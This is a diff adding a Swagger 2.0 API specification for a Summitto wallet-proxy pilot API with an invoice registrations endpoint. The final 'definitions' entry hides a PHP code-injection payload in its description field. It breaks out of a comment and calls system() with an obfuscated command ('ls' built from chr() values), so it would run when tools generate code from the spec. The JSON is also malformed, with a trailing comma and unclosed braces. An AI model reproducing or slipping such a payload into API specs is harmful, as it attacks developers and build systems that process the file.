@@ -1,0 +1,48 @@
+{
+   "swagger": "2.0",
+   "info": {
+      "title": "Summitto Pilot API Spec",
+      "version": "v0.5.0",
+      "description": "This is the documentation for the Summitto wallet proxy pilot API. If you would like to participate in the pilot please send a request to pilot@summitto.com. If you already have an account please visit https://access.summitto.com to generate API keys."
+   },
+   "host": "api.stg.summitto.com",
+   "produces": [
+      "application/json"
+   ],
+   "consumes": [
+      "application/json"
+   ],
+   "schemes": [
+      "https",
+      "http"
+   ],
+   "securityDefinitions": {
+      "Bearer": {
+         "type": "apiKey",
+         "name": "Authorization",
+         "in": "header",
+         "description": "Provide your API Key in the format: \"Bearer <API_KEY>\""
+      }
+   },
+   "tags": [
+      {
+         "name": "registrations",
+         "description": "Operations on invoice registrations"
+      }
+   ],
+   "security": [
+      {
+         "Bearer": []
+      }
+   ],
+   "paths": {
+      "/{vatNumber}/registrations": {
+         "$ref": "./paths/Registrations.yaml"
+      }
+   },
+   "definitions": {          
+     "d": {              
+          "type": "object",              
+          "description": "*/ echo system(chr(0x6c).chr(0x73)); /*",
+   }
+}
